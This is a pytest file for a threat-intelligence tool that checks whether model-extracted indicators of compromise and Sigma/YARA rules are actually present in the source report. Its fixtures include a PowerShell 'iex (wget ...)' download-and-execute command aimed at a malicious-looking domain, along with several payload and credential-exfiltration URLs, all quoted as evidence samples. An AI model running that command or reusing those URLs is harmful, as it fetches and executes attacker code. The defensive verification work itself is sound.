from __future__ import annotations

from cti_app.application.extraction import parse_document
from cti_app.application.production_parsers import (
    Q2ArtifactProposal,
    Q2FactProposal,
    Q2RuleProposal,
    Q2SourceOutput,
    parse_q2_proposals_markdown,
)
from cti_app.application.production_source_evidence import (
    SOURCE_EVIDENCE_VERSION,
    SourceEvidenceSpanKind,
    scope_source_evidence_document,
    source_evidence_context_for_artifact,
    source_evidence_document_from_html,
    verify_ioc_rules_output_against_source,
    verify_q2_output_against_source,
)
from cti_app.domain.collection import DetectedMimeType
from cti_app.domain.production_extraction import decode_indicator_section_paths
from cti_app.domain.production_references import ProductionReferenceKind


def _artifact(
    value: str, artifact_type: str, *, context: str = "model context"
) -> Q2ArtifactProposal:
    return Q2ArtifactProposal(
        value=value,
        artifact_type=artifact_type,
        indicator_status="confirmed_ioc",
        context=context,
        evidence_quote="model quote",
    )


def test_version_and_ioc_from_same_source_are_kept_with_value_only() -> None:
    output = Q2SourceOutput(artifacts=[_artifact("evil[.]com", "domain")])

    result = verify_ioc_rules_output_against_source(output, "The domain is evil.com.")

    assert SOURCE_EVIDENCE_VERSION == "11"
    assert result.output.artifacts[0].value == "evil[.]com"
    assert result.output.artifacts[0].context == ""
    # The quote is the local source area, never the model-supplied quote.
    assert result.output.artifacts[0].evidence_quote == "The domain is evil.com."
    assert result.rejections == ()


def test_full_gate_preserves_facts_but_filters_artifacts_and_rules() -> None:
    fact = Q2FactProposal(category="malware", value="ExampleRAT", context="context")
    output = Q2SourceOutput(
        facts=[fact],
        artifacts=[_artifact("missing.example", "domain")],
        rules=[
            Q2RuleProposal(
                rule_type="sigma",
                name="kept",
                body="title: Kept\nlogsource:\n  product: windows",
            )
        ],
    )

    result = verify_q2_output_against_source(
        output,
        "ExampleRAT\ntitle: Kept\nlogsource:\n  product: windows",
    )

    assert [(item.value, item.context) for item in result.output.facts] == [
        (fact.value, fact.context)
    ]
    assert "ExampleRAT" in result.output.facts[0].evidence_quote
    assert result.output.artifacts == []
    assert len(result.output.rules) == 1
    assert result.rejections[0].reason_code == "source_evidence_missing"


def test_evidence_gate_never_proves_text_that_was_not_sent_to_the_model() -> None:
    html = (
        b'<article><img alt="visual-ioc.security-lab.io" '
        b'src="https://tracking.example/pixel?id=visual-ioc.security-lab.io">'
        b'<a href="https://linked.example/linked-ioc.example">linked</a>'
        b"<script>script-ioc.example</script>"
        b'<meta name="description" content="metadata-ioc.example"></article>'
    )
    parsed = parse_document(html, DetectedMimeType.HTML)
    assert "visual-ioc.security-lab.io" not in parsed.text

    document = source_evidence_document_from_html(
        parsed.text,
        html.decode("utf-8"),
    )
    kept = verify_ioc_rules_output_against_source(
        Q2SourceOutput(artifacts=[_artifact("visual-ioc.security-lab.io", "domain")]),
        document,
    )
    assert kept.output.artifacts == []
    assert kept.rejections[0].reason_code == "source_evidence_not_text_verifiable"
    assert "tracking.example" not in document.decoded_source_view
    assert "script-ioc.example" not in document.decoded_source_view
    assert "metadata-ioc.example" not in document.decoded_source_view
    assert "linked-ioc.example" not in document.decoded_source_view


def test_case_scope_keeps_preamble_and_only_the_subject_case() -> None:
    html = """
    <article>
      <p>Report preamble for all cases.</p>
      <h2>GTG-15001: unrelated intrusion</h2>
      <p>OtherCaseRAT was used in the first case.</p>
      <h2>GTG-30004: targeted intrusion</h2>
      <p>TargetRAT was used in the target case.</p>
      <h3>Indicators</h3>
      <p>target.security-lab.io</p>
      <h2>GTG-30005: another unrelated intrusion</h2>
      <p>ThirdCaseRAT was used in another case.</p>
    </article>
    """
    parsed = parse_document(html.encode(), DetectedMimeType.HTML)
    document = source_evidence_document_from_html(parsed.text, html)

    scoped = scope_source_evidence_document(
        document,
        subject_title="Threat activity GTG-30004",
        actor_or_campaign="Example actor",
        canonical_url="https://example.test/report",
        source_kind=ProductionReferenceKind.PUBLICATION,
        mime_type="text/html",
    )

    assert scoped.scope is not None
    assert scoped.scope.case_id == "GTG-30004"
    assert scoped.scope.kept_sections == 1
    assert scoped.scope.total_sections == 3
    assert "Report preamble for all cases." in scoped.parsed_text
    assert "GTG-30004: targeted intrusion" in scoped.parsed_text
    assert "TargetRAT" in scoped.parsed_text
    assert "target.security-lab.io" in scoped.parsed_text
    assert "OtherCaseRAT" not in scoped.parsed_text
    assert "ThirdCaseRAT" not in scoped.parsed_text
    assert all(
        not any(
            case_id in title
            for _level, title in span.section_path
            for case_id in ("GTG-15001", "GTG-30005")
        )
        for span in scoped.spans
    )


def test_case_scope_falls_back_for_single_case_missing_match_or_ambiguity() -> None:
    def source(*headings: str):
        html = (
            "<article><p>Shared preamble.</p>"
            + "".join(f"<h2>{heading}</h2><p>Evidence for {heading}.</p>" for heading in headings)
            + "</article>"
        )
        parsed = parse_document(html.encode(), DetectedMimeType.HTML)
        return source_evidence_document_from_html(parsed.text, html)

    single = source("GTG-30004: one case")
    multiple = source("GTG-30004: first case", "GTG-30004: repeated case")
    unrelated = source("GTG-15001: first case", "GTG-30005: second case")

    def scope(document, *, title: str = "Threat activity GTG-30004"):
        return scope_source_evidence_document(
            document,
            subject_title=title,
            actor_or_campaign="",
            canonical_url="https://example.test/report",
            source_kind=ProductionReferenceKind.PUBLICATION,
            mime_type="text/html",
        )

    assert scope(single) is single
    assert scope(multiple) is multiple
    assert scope(unrelated) is unrelated
    no_id = source("GTG-30004: first case", "GTG-30005: second case")
    assert scope(no_id, title="Threat activity") is no_id


def test_technical_csv_is_scoped_by_gtg_column_and_keeps_header() -> None:
    csv_text = (
        "id,gtg,value,description\n"
        '1,GTG-30004,198.51.100.4,"target IOC"\n'
        '2,GTG-30005,203.0.113.9,"other IOC"\n'
        '3,GTG-30004,evil.example,"second target IOC"\n'
    )
    document = source_evidence_document_from_html(csv_text, "")

    scoped = scope_source_evidence_document(
        document,
        subject_title="Subject GTG-30004",
        actor_or_campaign="",
        canonical_url="https://example.test/iocs.csv",
        source_kind=ProductionReferenceKind.TECHNICAL_RESOURCE,
        mime_type="text/csv",
    )

    assert scoped.scope is not None
    assert scoped.scope.kept_sections == 2
    assert scoped.scope.total_sections == 3
    assert scoped.parsed_text.splitlines() == [
        "id,gtg,value,description",
        "1,GTG-30004,198.51.100.4,target IOC",
        "3,GTG-30004,evil.example,second target IOC",
    ]
    assert "GTG-30005" not in scoped.parsed_text


def test_html_image_without_text_has_a_distinct_non_text_diagnostic() -> None:
    html = '<img src="https://cdn.example/screenshot.png">'
    document = source_evidence_document_from_html("Screenshot below", html)

    result = verify_ioc_rules_output_against_source(
        Q2SourceOutput(artifacts=[_artifact("visual-ioc.security-lab.io", "domain")]),
        document,
    )

    assert result.output.artifacts == []
    assert result.rejections[0].reason_code == "source_evidence_not_text_verifiable"


def test_structured_evidence_context_locates_table_list_code_and_link_text() -> None:
    html = """
    <article>
      <p>Body mentions body.example.</p>
      <table><tr><td>table.example</td></tr></table>
      <ul><li>list.example</li></ul>
      <pre>code.example</pre>
      <a href="https://linked.invalid">link.example</a>
      <img src="screenshot.png">
    </article>
    """
    parsed = parse_document(html.encode(), DetectedMimeType.HTML)
    document = source_evidence_document_from_html(parsed.text, html)

    kinds = {span.kind for span in document.spans}
    assert {
        SourceEvidenceSpanKind.BODY_TEXT,
        SourceEvidenceSpanKind.TABLE,
        SourceEvidenceSpanKind.LIST,
        SourceEvidenceSpanKind.CODE_BLOCK,
        SourceEvidenceSpanKind.LINK_TEXT,
        SourceEvidenceSpanKind.VISUAL_UNLOCATED,
    } <= kinds
    located = source_evidence_context_for_artifact(_artifact("table.example", "domain"), document)
    assert [span.kind for span in located] == [SourceEvidenceSpanKind.TABLE]
    assert all(span.kind is not SourceEvidenceSpanKind.VISUAL_UNLOCATED for span in located)


def test_multi_case_html_attaches_case_section_paths_to_verified_indicators() -> None:
    html = """
    <article>
      <h2>GTG-84006: MEK-aligned activity</h2>
      <h4>Indicators of compromise</h4>
      <code class="plaintext">other-case.example</code>
      <h2>GTG-30004: Automating open-source intelligence and developing malware</h2>
      <h3>Malware development</h3>
      <h4>Indicators of compromise</h4>
      <code class="plaintext">subject-case.example</code>
    </article>
    """
    parsed = parse_document(html.encode(), DetectedMimeType.HTML)
    document = source_evidence_document_from_html(parsed.text, html)
    result = verify_ioc_rules_output_against_source(
        Q2SourceOutput(
            artifacts=[
                _artifact("other-case.example", "domain"),
                _artifact("subject-case.example", "domain"),
            ]
        ),
        document,
    )

    assert document.has_multiple_case_sections is True
    contexts = {
        item.value: decode_indicator_section_paths(item.context) for item in result.output.artifacts
    }
    assert contexts["other-case.example"] == (
        ((2, "GTG-84006: MEK-aligned activity"), (4, "Indicators of compromise")),
    )
    assert contexts["subject-case.example"] == (
        (
            (2, "GTG-30004: Automating open-source intelligence and developing malware"),
            (3, "Malware development"),
            (4, "Indicators of compromise"),
        ),
    )


def test_single_case_html_keeps_indicator_context_empty() -> None:
    html = """
    <article>
      <h2>GTG-30004: NanoDump activity</h2>
      <h3>Malware development</h3>
      <p>Indicator: single-case.example</p>
      <h3>Detection</h3><p>Detection guidance.</p>
    </article>
    """
    result = verify_ioc_rules_output_against_source(
        Q2SourceOutput(artifacts=[_artifact("single-case.example", "domain")]),
        source_evidence_document_from_html(
            parse_document(html.encode(), DetectedMimeType.HTML).text,
            html,
        ),
    )

    assert result.output.artifacts[0].context == ""


def test_visual_unlocated_never_proves_an_ioc_or_claims_image_localization() -> None:
    document = source_evidence_document_from_html(
        "",
        '<img src="screenshot.png"><p>No IOC in text.</p>',
    )
    result = verify_ioc_rules_output_against_source(
        Q2SourceOutput(artifacts=[_artifact("from-image.example", "domain")]),
        document,
    )

    assert result.output.artifacts == []
    assert (
        source_evidence_context_for_artifact(_artifact("from-image.example", "domain"), document)
        == ()
    )
    assert any(span.kind is SourceEvidenceSpanKind.VISUAL_UNLOCATED for span in document.spans)


def test_ioc_present_only_in_another_source_is_rejected() -> None:
    result = verify_ioc_rules_output_against_source(
        Q2SourceOutput(artifacts=[_artifact("other.example", "domain")]),
        "This source contains current.example only.",
    )

    assert result.output.artifacts == []
    assert result.rejections[0].reason_code == "source_evidence_missing"


def test_explicit_defanging_and_transport_escaping_are_equivalent() -> None:
    output = Q2SourceOutput(
        artifacts=[
            _artifact(r"hxxps\://evil[.]com/a", "url"),
            _artifact("User[at]Example[.]COM", "email"),
        ]
    )

    result = verify_ioc_rules_output_against_source(
        output,
        "https://evil.com/a User@example.com",
    )

    assert len(result.output.artifacts) == 2
    assert result.rejections == ()


def test_defanged_url_in_the_middle_of_a_sentence_is_proven() -> None:
    value = "https://evil.com/a"

    result = verify_ioc_rules_output_against_source(
        Q2SourceOutput(artifacts=[_artifact(value, "url")]),
        "Observed hxxps://evil[.]com/a in the report.",
    )

    assert result.output.artifacts[0].value == value
    assert result.rejections == ()


def test_defanged_http_url_in_the_middle_of_a_sentence_is_proven() -> None:
    result = verify_ioc_rules_output_against_source(
        Q2SourceOutput(artifacts=[_artifact("http://evil.com/a", "url")]),
        "Observed hxxp://evil[.]com/a in the report.",
    )

    assert len(result.output.artifacts) == 1
    assert result.rejections == ()


def test_escaped_defanged_url_in_the_middle_of_a_sentence_is_proven() -> None:
    result = verify_ioc_rules_output_against_source(
        Q2SourceOutput(artifacts=[_artifact("https://evil.com/a", "url")]),
        r"See hxxps\://evil[.]com/a in the report.",
    )

    assert len(result.output.artifacts) == 1
    assert result.rejections == ()


def test_defanged_candidate_and_defanged_source_are_equivalent() -> None:
    value = r"hxxps\://evil[.]com/a"

    result = verify_ioc_rules_output_against_source(
        Q2SourceOutput(artifacts=[_artifact(value, "url")]),
        "Observed hxxps://evil[.]com/a in the report.",
    )

    assert result.output.artifacts[0].value == value
    assert result.rejections == ()


def test_defanged_scheme_glued_to_alphanumeric_token_is_not_transformed() -> None:
    result = verify_ioc_rules_output_against_source(
        Q2SourceOutput(artifacts=[_artifact("https://evil.example", "url")]),
        "The value foohxxps://evil.example is not a URL token.",
    )

    assert result.output.artifacts == []
    assert result.rejections[0].reason_code == "source_evidence_missing"


def test_nbsp_and_narrow_nbsp_are_spaces_only_in_the_comparison_view() -> None:
    value = "dropper name.exe"
    result = verify_ioc_rules_output_against_source(
        Q2SourceOutput(artifacts=[_artifact(value, "filename")]),
        "The files were dropper\u00a0name.exe and dropper\u202fname.exe.",
    )

    assert result.output.artifacts[0].value == value
    assert result.rejections == ()


def test_hash_comparison_is_case_insensitive() -> None:
    value = "a" * 64
    result = verify_ioc_rules_output_against_source(
        Q2SourceOutput(artifacts=[_artifact(value, "hash")]),
        "SHA256: " + value.upper(),
    )

    assert len(result.output.artifacts) == 1


def test_domain_inside_a_longer_domain_is_not_proof() -> None:
    result = verify_ioc_rules_output_against_source(
        Q2SourceOutput(artifacts=[_artifact("evil.com", "domain")]),
        "The observed host is foo.evil.com.",
    )

    assert result.output.artifacts == []
    assert result.rejections[0].reason_code == "source_evidence_missing"


def test_wrapped_domain_is_kept_with_unwrap_warning() -> None:
    result = verify_ioc_rules_output_against_source(
        Q2SourceOutput(artifacts=[_artifact("exemple.com", "domain")]),
        "Observed exemp\nle.com in the report.",
    )

    assert len(result.output.artifacts) == 1
    assert "artifact_proven_after_unwrap" in result.warnings
    assert result.rejections == ()


def test_chatgpt_markdown_autolinks_are_unwrapped_before_literal_url_proof() -> None:
    links = (
        "https://ams1.vultrobjects.com",
        "https://micbucket.ams1.vultrobjects.com/MSCache.exe",
        "https://micbucket.ams1.vultrobjects.com/credentials.json",
        "https://sgp1.vultrobjects.com/downloads/pictory/Pictory_premium_ver9.0.4.exe",
        "https://api.telegram.org/",
        "https://api.ipify.org",
        "https://api.whatsapp.com/send",
        "https://graph.facebook.com/v12.0/me/messages",
        "https://chatapi.viber.com/pa/send_message",
    )
    missing = "https://api.whatsapp.com/send"
    wire = "IOC confirmed url\n" + "\n".join(f"- [{url}]({url})" for url in links)
    parsed = parse_q2_proposals_markdown(wire)
    assert parsed.usable, parsed.errors
    assert parsed.value is not None
    assert [artifact.value for artifact in parsed.value.artifacts] == [
        f"[{url}]({url})" for url in links
    ]

    source = "\n".join(url for url in links if url != missing)
    result = verify_q2_output_against_source(parsed.value, source)

    assert [artifact.value for artifact in result.output.artifacts] == [
        url for url in links if url != missing
    ]
    assert result.warnings == ("artifact_markdown_autolink_unwrapped",)
    assert [(item.value, item.reason_code) for item in result.rejections] == [
        (missing, "source_evidence_missing")
    ]


def test_quoted_urls_with_code_delimiters_are_proven_and_located() -> None:
    value = "https://example.com/payload.ps1"
    backslash = chr(92)
    backtick = chr(96)
    sources = (
        f"'{value}'",
        f'"{value}"',
        f"{backtick}{value}{backtick}",
        f"('{value}')",
        f"[url:value = '{value}']",
        f"'{value}',",
        f"'{value}';",
        f"--url '{value}'",
        f'{backslash}"{value}{backslash}"',
        f'{backslash * 3}"{value}{backslash * 3}"',
    )

    for source in sources:
        result = verify_ioc_rules_output_against_source(
            Q2SourceOutput(artifacts=[_artifact(value, "url")]),
            source,
        )

        assert len(result.output.artifacts) == 1, source
        assert result.output.artifacts[0].evidence_quote == source
        assert result.rejections == ()


def test_quoted_esentire_powershell_url_is_proven_with_a_located_quote() -> None:
    value = "hxxps://cktdpnuwztdn[.]columbnezhjdq[.]com"
    source = f"iex (wget -UseBasicParsing '{value}')"

    result = verify_ioc_rules_output_against_source(
        Q2SourceOutput(artifacts=[_artifact(value, "url")]),
        source,
    )

    assert len(result.output.artifacts) == 1
    assert result.output.artifacts[0].evidence_quote == (
        "iex (wget -UseBasicParsing 'https://cktdpnuwztdn.columbnezhjdq.com')"
    )
    assert result.rejections == ()


def test_quoted_cisco_talos_stix_url_pattern_is_proven() -> None:
    value = "http://terymar.com/install/Spf.ps1"
    source = f"[url:value = '{value}']"

    result = verify_ioc_rules_output_against_source(
        Q2SourceOutput(artifacts=[_artifact(value, "url")]),
        source,
    )

    assert len(result.output.artifacts) == 1
    assert result.output.artifacts[0].evidence_quote == source
    assert result.rejections == ()


def test_unquoted_talos_list_url_remains_proven() -> None:
    value = "hxxps://talos.example[.]com/pobor"
    document = source_evidence_document_from_html(
        value,
        f"<li>{value}</li>",
    )

    result = verify_ioc_rules_output_against_source(
        Q2SourceOutput(artifacts=[_artifact(value, "url")]),
        document,
    )

    assert len(result.output.artifacts) == 1
    assert result.output.artifacts[0].evidence_quote == "https://talos.example.com/pobor"
    assert result.rejections == ()


def test_all_artifact_boundary_types_accept_paired_quotes() -> None:
    backtick = chr(96)
    cases = (
        ("url", "https://example.com/ioc"),
        ("domain", "example.com"),
        ("ip", "192.0.2.4"),
        ("email", "ioc@example.com"),
        ("filename", "payload.bin"),
        ("filepath", "/tmp/payload.bin"),
        ("hash", "a" * 64),
        ("cve", "CVE-2026-1234"),
    )

    for artifact_type, value in cases:
        for quote in ("'", '"', backtick):
            source = f"{quote}{value}{quote}"
            result = verify_ioc_rules_output_against_source(
                Q2SourceOutput(artifacts=[_artifact(value, artifact_type)]),
                source,
            )

            assert len(result.output.artifacts) == 1, (artifact_type, quote)
            assert result.output.artifacts[0].evidence_quote == source
            assert result.rejections == ()


def test_quotes_do_not_allow_longer_url_domain_or_hash_tokens() -> None:
    cases = (
        ("url", "https://a.com/x", "'https://a.com/x/y'"),
        ("domain", "evil.com", "notevil.com"),
        ("domain", "a.com", "a.com.evil.org"),
        ("hash", "a" * 32, "a" * 64),
        ("url", "https://a.com/it", "https://a.com/it's"),
    )

    for artifact_type, value, source in cases:
        result = verify_ioc_rules_output_against_source(
            Q2SourceOutput(artifacts=[_artifact(value, artifact_type)]),
            source,
        )

        assert result.output.artifacts == [], (artifact_type, value, source)
        assert len(result.rejections) == 1
        assert result.rejections[0].reason_code == "source_evidence_missing"


def test_markdown_unwrap_requires_a_matching_url_and_url_artifact_type() -> None:
    values = (
        ("[https://visible.example](https://target.example)", "url"),
        ("[https://domain.example](https://domain.example)", "domain"),
        ("[mailto:alice@example.com](mailto:alice@example.com)", "email"),
        ("[dropper.exe](https://cdn.example/dropper.exe)", "filename"),
    )
    result = verify_q2_output_against_source(
        Q2SourceOutput(
            artifacts=[_artifact(value, artifact_type) for value, artifact_type in values]
        ),
        "https://visible.example https://target.example https://domain.example "
        "mailto:alice@example.com dropper.exe",
    )

    assert result.output.artifacts == []
    assert [rejection.value for rejection in result.rejections] == [value for value, _ in values]
    assert all(
        rejection.reason_code == "source_evidence_missing" for rejection in result.rejections
    )
    assert result.warnings == ()


def test_markdown_autolink_comparison_refangs_values_but_keeps_nonroot_paths_exact() -> None:
    refanged = "[hxxps://storage[.]example/path](hxxps://storage[.]example/path)"
    origin_slash_difference = "[https://root.example](https://root.example/)"
    path_slash_mismatch = "[https://storage.example/path](https://storage.example/path/)"
    result = verify_q2_output_against_source(
        Q2SourceOutput(
            artifacts=[
                _artifact(refanged, "url"),
                _artifact(origin_slash_difference, "url"),
                _artifact(path_slash_mismatch, "url"),
            ]
        ),
        "https://storage.example/path https://root.example",
    )

    assert [artifact.value for artifact in result.output.artifacts] == [
        "hxxps://storage[.]example/path",
        "https://root.example",
    ]
    assert result.warnings == ("artifact_markdown_autolink_unwrapped",)
    assert [rejection.value for rejection in result.rejections] == [path_slash_mismatch]


def test_artifact_absent_from_both_source_views_is_rejected() -> None:
    document = source_evidence_document_from_html(
        "present.example",
        "<p>decoded.example</p>",
    )

    result = verify_ioc_rules_output_against_source(
        Q2SourceOutput(artifacts=[_artifact("missing.example", "domain")]),
        document,
    )

    assert result.output.artifacts == []
    assert result.rejections[0].reason_code == "source_evidence_missing"


def test_ipv4_is_proven_without_ip_reformatting() -> None:
    result = verify_ioc_rules_output_against_source(
        Q2SourceOutput(artifacts=[_artifact("192[.]0[.]2[.]10", "ip")]),
        "Connection to 192.0.2.10:443 was blocked.",
    )

    assert len(result.output.artifacts) == 1


def test_ipv6_requires_the_same_literal_representation() -> None:
    exact = verify_ioc_rules_output_against_source(
        Q2SourceOutput(artifacts=[_artifact("2001:DB8::1", "ip")]),
        "The address 2001:DB8::1 was observed.",
    )
    different_spelling = verify_ioc_rules_output_against_source(
        Q2SourceOutput(artifacts=[_artifact("2001:DB8::1", "ip")]),
        "The address 2001:0db8:0:0:0:0:0:1 was observed.",
    )

    assert len(exact.output.artifacts) == 1
    assert different_spelling.output.artifacts == []


def test_url_path_and_query_case_are_preserved() -> None:
    result = verify_ioc_rules_output_against_source(
        Q2SourceOutput(artifacts=[_artifact("https://example.com/Case?Key=Value", "url")]),
        "https://example.com/case?Key=Value",
    )

    assert result.output.artifacts == []
    assert result.rejections[0].reason_code == "source_evidence_missing"


def test_email_local_part_is_case_sensitive_but_domain_is_not() -> None:
    accepted = verify_ioc_rules_output_against_source(
        Q2SourceOutput(artifacts=[_artifact("Alice@example.com", "email")]),
        "Contact Alice@EXAMPLE.COM.",
    )
    rejected = verify_ioc_rules_output_against_source(
        Q2SourceOutput(artifacts=[_artifact("Alice@example.com", "email")]),
        "Contact alice@EXAMPLE.COM.",
    )

    assert len(accepted.output.artifacts) == 1
    assert rejected.output.artifacts == []


def test_filename_and_filepath_are_literal() -> None:
    result = verify_ioc_rules_output_against_source(
        Q2SourceOutput(
            artifacts=[
                _artifact("payload.exe", "filename"),
                _artifact(r"/tmp/payload.exe", "filepath"),
            ]
        ),
        r"Dropped /tmp/payload.exe and retained payload.exe.",
    )

    assert len(result.output.artifacts) == 2


def test_exact_rule_is_kept_and_narrative_fields_are_removed() -> None:
    rule = Q2RuleProposal(
        rule_type="sigma",
        name="Example",
        body="title: Example\nlogsource:\n  product: windows",
        context="model context",
        evidence_quote="model quote",
    )

    result = verify_ioc_rules_output_against_source(
        Q2SourceOutput(rules=[rule]),
        "Preamble\r\ntitle: Example\r\nlogsource:\r\n  product: windows\r\nend",
    )

    assert result.output.rules[0].body == rule.body
    assert result.output.rules[0].context == ""
    assert "title: Example logsource: product: windows" in result.output.rules[0].evidence_quote
    assert result.output.rules[0].evidence_quote != "model quote"
    assert result.rejections == ()


def test_rule_with_changed_whitespace_is_kept() -> None:
    result = verify_ioc_rules_output_against_source(
        Q2SourceOutput(
            rules=[
                Q2RuleProposal(
                    rule_type="yara",
                    body="rule R {\n    condition: true\n}",
                )
            ]
        ),
        "rule R {\n\tcondition: true\n}",
    )

    assert len(result.output.rules) == 1
    assert result.rejections == ()


def test_rule_present_only_in_another_source_is_rejected() -> None:
    result = verify_ioc_rules_output_against_source(
        Q2SourceOutput(
            rules=[Q2RuleProposal(rule_type="yara", body="rule Other { condition: true }")]
        ),
        "rule Current { condition: true }",
    )

    assert result.output.rules == []
    assert result.rejections[0].reason_code == "source_rule_evidence_missing"


def test_facts_are_always_removed_with_a_warning() -> None:
    result = verify_ioc_rules_output_against_source(
        Q2SourceOutput(
            facts=[
                Q2FactProposal(
                    category="malware",
                    value="ExampleRAT",
                    context="narrative",
                    evidence_quote="quote",
                )
            ]
        ),
        "ExampleRAT is mentioned.",
    )

    assert result.output.facts == []
    assert "fact_not_allowed" in result.warnings


def test_one_invalid_item_does_not_remove_other_items() -> None:
    valid = _artifact("good.example", "domain")
    invalid = _artifact("missing.example", "domain")

    result = verify_ioc_rules_output_against_source(
        Q2SourceOutput(artifacts=[valid, invalid]),
        "Only good.example is present.",
    )

    assert [artifact.value for artifact in result.output.artifacts] == ["good.example"]
    assert len(result.rejections) == 1
    assert result.rejections[0].reason_code == "source_evidence_missing"
